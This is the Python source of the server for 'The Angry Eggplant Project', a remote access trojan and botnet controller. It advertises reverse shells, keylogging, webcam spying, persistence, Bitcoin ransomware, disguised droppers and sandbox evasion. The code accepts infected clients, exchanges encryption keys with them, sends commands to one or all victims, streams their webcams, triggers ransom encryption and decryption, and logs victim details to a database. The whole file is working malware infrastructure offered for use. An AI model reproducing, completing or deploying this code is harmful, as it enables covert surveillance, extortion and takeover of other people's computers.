#!/usr/bin/python
# The Angry Eggplant Project
# https://github.com/colental/ae


'''

   The Angry Eggplant Project
    
>  30+ modules - interactive & automated
    - Reverse Shell   remotely access host machine with a shell
    - Root Acess      obtain administrator privileges
    - Keylogger       log user keystrokes with the window they were entered in
    - Webcam          capture image/video or stream live
    - Screenshot      snap shots of the host desktop
    - Persistence     maintain access with 8 different persistence methods
    - Packetsniffer   monitor host network traffic for valuable information
    - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
    - Ransom          encrypt host files and ransom them to the user for Bitcoin
    - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
    - Email           Outlook email of a logged in user can be accessed without authentication
    - SMS             Send & receive SMS text messages with user's contacts
    
>  Portability - supports all major platforms & architectures
    - no configuration - dynamically generates a unique client configured for the host
    - no dependencies - packages, interpreter & modules all loaded remotely
    - multiple file types - .exe (Windows), .sh (Linux) .app (Mac OS X), .apk (Android)
    - normal mode - dropper is executable or application and disguised as plugin update
    - fileless mode - everything loaded remotely, never exists on disk 
    
>  Security
    - state of the art encryption - AES cipher in authenticated OCB mode with 256-bit key
    - Diffie-Hellman Key Agreement - key is secure even on monitored networks
    - secure communication - message confidentiality, authenticity, & integrity
    - anti-forensics countermeasures - sandbox detection, virtual machine detection

'''

from __future__ import print_function

for package in ['os', 'sys', 'cv2', 'json', 'time', 'numpy', 'Queue', 'pickle', 'socket', 'struct', 'base64', 'signal', 'random', 'hashlib', 'urllib2', 'logging', 'requests',  'warnings', 'colorama', 'datetime', 'functools', 'cStringIO', 'threading', 'subprocess', 'collections', 'configparser', 'mysql.connector', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.PublicKey.RSA', 'Crypto.Cipher.PKCS1_OAEP']:
    try:
        exec "import %s" % package in globals()
    except ImportError as e:
        print

class DatabaseError(Exception):
    pass

class ServerError(Exception):
    pass

class ClientError(Exception):
    pass


class aeServer(threading.Thread):
    '''
    Copyright (c) 2017 Daniel Vega-Myhre

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.

    IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
    '''

    banner = open('../resources/banner.txt', 'r').read() if os.path.isfile('../resources/banner.txt') else str('\n' * 30 + '\tThe Angry Eggplant Project')

    def __init__(self, port=1337, debug=True, **kwargs):
        super(aeServer, self).__init__()
        self.exit_status        = 0
        self.count              = 1
        self.clients            = {}
        self.current_client     = None
        self.prompt             = None
        self.name               = time.time()
        self.q                  = Queue.Queue()
        self.shell              = threading.Event()
        self.lock               = threading.Lock()
        self.config             = self._get_config()
        self.commands           = self._get_commands()
        self.database           = mysql.connector.Connect()
        self._text_color        = getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
        self._text_style        = colorama.Style.DIM
        self._prompt_color      = colorama.Fore.RESET
        self._prompt_style      = colorama.Style.BRIGHT
        self._sockets           = self._get_sockets()
        self._handlers          = self._get_handlers()
        self.shell.set()

    def _prompt(self, data):
        return raw_input(self._prompt_color + self._prompt_style + '\n' + data + self._text_color + self._text_style)
    
    def _error(self, data):
        if self.current_client:
            with self.current_client.lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
        else:
            with self.lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')

    def _print(self, info):
        if info and len(info):
            lock = self.lock if not self.current_client else self.current_client.lock
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))

    def _return(self, data=None):
        if not self.current_client:
            with self.lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self.prompt, end="")
        else:
            with self.current_client.lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self.current_client.prompt, end="")

    def _get_config(self):
        config = configparser.ConfigParser()
        if os.path.isfile('../config.ini'):
            _  = config.read('../config.ini')
        else:
            raise ServerError("missing configuration file")
        return config

    def _get_commands(self):
        return {
            '$'             :   self.server_eval_code,
            'back'          :   self.background_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'exit'          :   self.quit_server,
            'help'          :   self.show_usage_help,
            'kill'          :   self.remove_client,
            'quit'          :   self.quit_server,
            'query'         :   self.database_query,
            'ransom'        :   self.ransom_client,
            'results'       :   self.show_task_results,
            'save'          :   self.save_task_results,
	    'sendall'	    :   self.sendall_clients,
            'settings'      :   self.display_settings,
            'webcam'        :   self.webcam_client
            }

    def _get_status(self, timestamp):
        try:
            c = time.time() - float(timestamp)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            return "{} error: {}".format(self._get_status.func_name, str(e))

    def _get_sockets(self):
        try:
            print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + self.banner + colorama.Fore.WHITE + "\n\n")
            print(colorama.Fore.YELLOW + " [?] " + colorama.Fore.RESET + "Hint: show usage information with the 'help' command\n")
            if self.config.has_section('database'):
                try:
                    self.database.config(**self.config['database'])
                    self.database.connect()
                    print(colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Connected to database")
                except:
                    max_v = max(map(len, self.config['database'].values())) + 2
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + " [!] " + colorama.Fore.RESET + "Warning: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s3.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s1.bind(('0.0.0.0', port))
            s2.bind(('0.0.0.0', port + 1))
            s3.bind(('0.0.0.0', port + 2))
            s1.listen(10)
            s2.listen(10)
            s3.listen(10)
            sockets = collections.namedtuple('Sockets', ['shell','resource','task'])
            return sockets(s1, s2, s3)
        except Exception as e:
            return "{} error: {}".format(self._get_sockets.func_name, str(e))

    def _get_handlers(self):
        try:
            t1 = threading.Thread(target=self.shell_handler, name=time.time())
            t1.daemon = True
            t1.start()
            t2 = threading.Thread(target=self.resource_handler, name=time.time())
            t2.daemon = True
            t2.start()
            t3 = threading.Thread(target=self.task_handler, name=time.time())
            t3.daemon = True
            t3.start()
            handler = collections.namedtuple('Handlers', ['shell','resource','task'])
            return handler(t1, t2, t3)
        except Exception as e:
            return "{} error: {}".format(self._get_handlers.func_name, str(e))

    def _execute_sql(self, cursor, query):
        try:
            result  = []
            cmd, _, action = str(query).partition(' ')
            if cmd in ('call','CALL'):
                proc, _, args = str(action).partition(' ')
                args    = args.split()
                cursor.callproc(proc, args)
            else:
                cursor.execute(query)
                output = cursor.fetchall()
                result = []
                if output and isinstance(output, list):
                    for row in output:
                        row = row._asdict()
                        for attr in [key for key,value in row.items() if key in ('last_update','completed','timestamp')]:
                            if isinstance(value, datetime.datetime):
                                row[key] = value.ctime()
                        result.append(row)
                return result
            
        except Exception as e:
            return "{} error: {}".format(self._execute_sql.func_name, str(e))
            
    def _encrypt(self, data, key):
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        output = b''.join((cipher.nonce, tag, ciphertext))
        return base64.b64encode(output)

    def _decrypt(self, data, key):
        data = cStringIO.StringIO(base64.b64decode(data))
        nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
        try:
            return cipher.decrypt_and_verify(ciphertext, tag)
        except:
            return cipher.decrypt(ciphertext) + '\n(Authentication check failed - transmission may have been compromised)\n'

    def encrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
        try:
            return self._encrypt(data, client.session_key)
        except Exception as e:
            self._error("{} error: {}".format(self.encrypt.func_name, str(e)))

    def decrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
        try:
            return self._decrypt(data, client.session_key)
        except ValueError:
            self._error("{} error: authentication failed - network communication may be compromised".format(self.decrypt.func_name))
        except Exception as e:
            self._error("{} error: {}".format(self.decrypt.func_name, str(e)))

    def send_client(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
        try:
            task_id = self.new_task_id(command, client_id)
            task    = {'task': task_id, 'client': client.info['id'], 'session': client.session, 'command': command}
            data    = self.encrypt(json.dumps(task), client.name) + '\n'
            client.connection.sendall(data)
        except Exception as e:
            time.sleep(1)
            self._error(str(e))
    
    def recv_client(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client  = self.clients[int(client_id)]
        elif self.current_client:
            client  = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
        try:
            buf = client.connection.recv(65536)
            if buf:
                try:
                    data = self.decrypt(buf.rstrip(), client.name)
                    try:
                        return json.loads(data)
                    except:
                        return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(data)}
                except:
                    pass
            return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(buf)}
        except Exception as e:
            time.sleep(1)
            self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
            client.shell.clear()
            self.remove_client(client.name)
            self.shell.set()
            self.run()

    def get_clients(self):
        return [v for v in self.clients.values()]

    def select_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._error("Client '{}' does not exist".format(client_id))
        else:
            self.shell.clear()
            if self.current_client:
                self.current_client.shell.clear()
            client = self.clients[int(client_id)]
            self.current_client = client
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
            self.current_client.shell.set()
            return self.current_client.run()

    def background_client(self, client_id=None):
        if not client_id:
            if self.current_client:
                self.current_client.shell.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
                self.clients[int(client_id)].shell.clear()
        self.current_client = None
        self.shell.set()
    
    def sendall_clients(self, msg):
        for client in self.get_clients():
            try:
                self.send_client(msg, client.name)
            except Exception as e:
                self._error('{} returned error: {}'.format(self.sendall_clients.func_name, str(e)))
    
    def remove_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            return
        else:
            try:
                client = self.clients[int(client_id)]
                client.shell.clear()
                self.send_client('kill', client_id)
                try:
                    client.connection.close()
                except: pass
                try:
                    client.connection.shutdown()
                except: pass
                _ = self.clients.pop(int(client_id), None)
                del _
                print(self._text_color + self._text_style)
                if not self.current_client:
                    with self.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.set()
                    client.shell.clear()
                    return self.run()
                elif int(client_id) == self.current_client.name:
                    with self.current_client.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.clear()
                    self.current_client.shell.set()
                    return self.current_client.run()
                else:
                    with self.lock:
                        print('Client {} disconnected'.format(client_id))
                    self.shell.clear()
                    self.current_client.shell.set()
                    return self.current_client.run()
            except Exception as e:
                self._error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))

    def list_clients(self):
        lock = self.lock if not self.current_client else self.current_client.lock
        with lock:
            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
            for k, v in self.clients.items():
                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
            print('\n')
          
    def quit_server(self):
        if self._prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for client in self.get_clients():
                client.shell.set()
                self.send_client('passive', client.name)
        self.exit_status = True
        self.shell.clear()
        print(colorama.Fore.RESET + colorama.Style.NORMAL)
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name is 'nt' else "kill -9 {}".format(os.getpid())).read()
        print('Exiting...')
        sys.exit(0)

    def server_eval_code(self, code):
        try:
            return eval(code)
        except Exception as e:
            return "Error: %s" % str(e)

    def display(self, info):
        print('\n')
        if isinstance(info, dict):
            if len(info):
                self._print(json.dumps(info))
        elif isinstance(info, list):
            if len(info):
                for data in info:
                    print(self._text_color + colorama.Style.BRIGHT + '\x20\x20%d\n' % int(info.index(data) + 1), end="")
                    self._print(data)
        elif isinstance(info, str):
            try:
                self._print(json.loads(info))
            except:
                print(self._text_color + self._text_style + str(info))
        else:
            self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
            
    def display_settings(self, args=None):
        if not args:
            print("\n")
            print(self._text_color + colorama.Style.BRIGHT + "Settings".center(40))
            print(self._text_color + self._text_style + 'default text color + style'.center(40))
            print(self._prompt_color + self._prompt_style + 'default prompt color + style'.center(40))
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':                
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                else:
                    print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        self.display("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self.display("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                else:
                    print("usage: settings text <option> [value]")

    def show_usage_help(self, info=None):
        column1 = 'command <arg>'
        column2 ='description'
        info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
        for key in sorted(info):
            print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
            
    def webcam_client(self, args=''):
        try:
            if not self.current_client:
                self._error( "No client selected")
                return
            client = self.current_client
            result = ''
            mode, _, arg = args.partition(' ')
            client.shell.clear()
            if not mode or str(mode).lower() == 'stream':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                retries = 5
                while retries > 0:
                    try:
                        port = random.randint(6000,9999)
                        s.bind(('0.0.0.0', port))
                        s.listen(1)
                        cmd = 'webcam stream {}'.format(port)
                        self.send_client(cmd, client.name)
                        conn, addr  = s.accept()
                        break
                    except:
                        retries -= 1
                header_size = struct.calcsize("L")
                window_name = addr[0]
                cv2.namedWindow(window_name)
                data = ""
                try:
                    while True:
                        while len(data) < header_size:
                            data += conn.recv(4096)
                        packed_msg_size = data[:header_size]
                        data = data[header_size:]
                        msg_size = struct.unpack("L", packed_msg_size)[0]
                        while len(data) < msg_size:
                            data += conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame = pickle.loads(frame_data)
                        cv2.imshow(window_name, frame)
                        key = cv2.waitKey(70)
                        if key == 32:
                            break
                finally:
                    conn.close()
                    cv2.destroyAllWindows()
                    result = 'Webcam stream ended'
            else:
                self.send_client("webcam %s" % args, client.name)
                task    = self.recv_client(client.name)
                result  = task.get('result')
            self.display(result)
        except Exception as e:
            self._error("webcam stream failed with error: {}".format(str(e)))

    def ransom_client(self, args=None):
        if self.current_client:
            if 'decrypt' in str(args):
                self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
            else:
                self.send_client("ransom %s" % args, self.current_client.name)
                return
        else:
            self._error("No client selected")

    def new_task_id(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID: {}".format(client_id))
        try:
            return hashlib.new('md5', bytes(client.info['id']) + bytes(command) + bytes(int(time.time()))).hexdigest()
        except Exception as e:
            self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))

    def show_task_results(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("No client selected")
        try:
            return self.database_query("SELECT * FROM tbl_tasks WHERE session='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""), display=False)
        except Exception as e:
            self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
    
    def save_task_results(self, task=None):
        try:
            if isinstance(task, dict):
                cmd, _, __  = bytes(task.get('command')).partition(' ')
                if cmd in self.config['tasks']:
                    value  = [task['client']]
                    exists = self.database_query("select * from tbl_tasks where id='{}'".format(task['id']), display=False)
                    if not exists:
                        values = [task['task'], task['client'], task['session'], task['command'], task['result']]
                    try:
                            self.database.callproc('sp_addTask', values)
                    except mysql.connector.InterfaceError:
                        pass
                    except Exception as e:
                        if self._debug:
                            self._error(str(e)) 
                if self._debug:
                    print(self._text_color + self._text_style + "Database Updated")
        except Exception as e:
            self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))

    def database_query(self, query, display=False):
        try:
            self.database.reconnect()
            cursor = self.database.cursor(named_tuple=True)
            result = self._execute_sql(cursor, query)
            if display:
                for row in result:
                    self.display(json.dumps(row))
            return result
        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
            print("Error: query failed - reconnecting...")
            self.database.reconnect()
        except Exception as e:
            self._error("{} error: {}".format(self.database_query.func_name, str(e)))

    def database_procedure(self, procedure, args=[], display=False):
        try:
            self.database.reconnect()          
            cursor = self.database.cursor(dictionary=True)
            cursor.callproc(procedure, args)
            if display:
                for result in cursor.stored_results():
                    for row in result.fetchall():
                        self.display(row)
        except mysql.connector.InterfaceError:
            pass

    def shell_handler(self):
        while True:
            connection, addr = self._sockets.shell.accept()
            private = Crypto.PublicKey.RSA.generate(2048)
            public  = private.publickey()
            client  = aeClient(connection, address=addr, name=self.count, private_key=private, public_key=public)
            self.clients[self.count] = client
            self.count  += 1
            client.start()
            print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd() if not self.current_client else str(self.current_client._prompt) % int(self.current_client.name)), end="")

    def task_handler(self):
        while True:
            connection, addr = self._sockets.task.accept()
            client = None
            try:
                for c in self.get_clients():
                    if c.address[0] == addr[0]:
                        client = c
                if client:
                    buf = ''
                    while '\n' not in buf:
                        buf += connection.recv(4096)
                    data = self.decrypt(buf.rstrip(), client.name)
                    try:
                        self.save_task_results(json.loads(data))
                    except Exception as e:
                        print("{} error: {}".format(self.task_handler.func_name, str(e)))
            finally:
                connection.shutdown(socket.SHUT_RDWR)
                connection.close()
            
                
    def resource_handler(self):
        while True:
            connection, addr = self._sockets.resource.accept()
            client = None
            for c in self.get_clients():
                if c.address == addr[0]:
                    client = c
                    break
            else:
                self._return('\n\nWarning: unknown connection attempt from %s:%s\n\n' % (addr[0], addr[1]))
                connection.close()
                continue
            data = ''
            while '\n' not in data:
                data += connection.recv(256)
            if data:
                try:
                    data = self._decrypt(data.rstrip(), client.session_key)
                    task = json.loads(data)
                except:
                    self._return("Error: request handler received invalid request - %s" % data)
                    continue
                client_id = task.get('client')
                if client.info.get('id') != client_id:
                    self._return('Warning: resource requested by invalid client id (expected: %s, received: %s)' % (client.info.get('id'), client_id))
                    continue
                request, _, resource = task.get('request').partition(' ')
                section, _, option   = resource.partition(' ')
                result = ''
                if request == 'api':
                    if section and server.config.has_section(section):
                        if not option:
                            result = json.dumps(server.config[section])
                        else:
                            if server.config[section].has_option(option):
                                result = server.config[section].get(option)
                            else:
                                self._return("invalid API %s option requested: %s" % (section, option))
                                continue
                    else:
                         self._return("invalid API type requested: %s" % section)
                         continue
                         
                elif request == 'resource':
                    if resource and resource in os.listdir('../resources'):
                        result = open('../resources/%s' % server.config[request].get(resource)).read()
                    else:
                        self._return("invalid resource requested: %s" % resource)
                        continue
                else:
                    self._return("invalid resource request: %s" % task.get('command'))
                task.update({'result': result})
                connection.sendall(self._encrypt(json.dumps(task), client.session_key) + '\n')
            
            
    def run(self):
        while True:
            try:
                self.shell.wait()
                self.prompt         = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()
                cmd_buffer          = self._prompt(self.prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output  = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output:
                        self.display(output)
                if self.exit_status:
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        sys.exit(0)


class aeClient(threading.Thread):

    global server

    _prompt     = None

    def __init__(self, connection, **kwargs):
        super(aeClient, self).__init__()
        self.connection     = connection
        self.shell          = threading.Event()
        self.lock           = threading.Lock()
        self.config         = self._config(**kwargs)
        self.session_key    = self._session_key()
        self.info           = self._info()
        self.session        = self._session()
        self.connection.setblocking(True)

    def _config(self, **kwargs):
        for k,v in kwargs.items():
            try:
                if str(k) == 'name' and str(v).isdigit():
                    self.name = v
                elif str(k) == 'address' and socket.inet_aton(v[0]) and str(v[1]).isdigit():
                    self.address = v
                elif str(k) == 'public_key' and isinstance(v, Crypto.PublicKey.RSA.RsaKey):
                    self.public_key = v
                elif str(k) == 'private_key' and isinstance(v, Crypto.PublicKey.RSA.RsaKey):
                    self.private_key     = v
                else:
                    pass
            except Exception as e:
                self._error(str(e))

    def _kill(self):
        self.shell.clear()
        server.remove_client(self.name)
        server.current_client = None
        server.shell.set()
        server.run()

    def _info(self):
        buf  = ''
        while '\n' not in buf:
            buf += self.connection.recv(1024)
        text  = server._decrypt(buf.rstrip(), self.session_key)
        data  = json.loads(text.rstrip())
        if data.get('id'):
            client = data.get('id')
            select = server.database_query("select * from tbl_clients where id='{}'".format(client), display=False)
            if select:
                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self.name))
                _ = server.database_query('UPDATE tbl_clients SET %s' % ("{}='{}'".format(attr,data[attr]) for attr in ['id','public_ip','local_ip',  'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture']), display=False)
            else:
                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self.name))
                server.display(json.dumps(data))
                values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
                try:
                    server.database_procedure('sp_addClient', values)
                except mysql.connector.InterfaceError:
                    pass
        return data
            
    def _session_key(self):
        try:
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            g  = 2
            Ax = pow(g, a, p)  
            self.connection.send(Crypto.Util.number.long_to_bytes(Ax))
            Bx = Crypto.Util.number.bytes_to_long(self.connection.recv(256))
            k  = pow(Bx, a, p) 
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(k)).hexdigest()
        except Exception as e:
            self._error("{} returned error: {}".format(self._session_key, str(e)))
            self._kill()

    def _session(self):
        try:
            session_id  = Crypto.Hash.MD5.new(json.dumps(self.info.get('id')) + str(int(time.time()))).hexdigest()
            ciphertext  = server._encrypt(session_id, self.session_key)
            self.connection.sendall(ciphertext + '\n')
            values      = [session_id, self.info.get('id'), self.session_key, self.public_key.exportKey(), self.private_key.exportKey()]
            cursor      = server.database.cursor(named_tuple=True)
            try:
                cursor.callproc('sp_addSession', values)
            except mysql.connector.InterfaceError:
                pass
            ciphertext  = ""
            while "\n" not in ciphertext:
                ciphertext += self.connection.recv(1024)
            plaintext   = server._decrypt(ciphertext.rstrip(), self.session_key)
            request     = json.loads(plaintext)
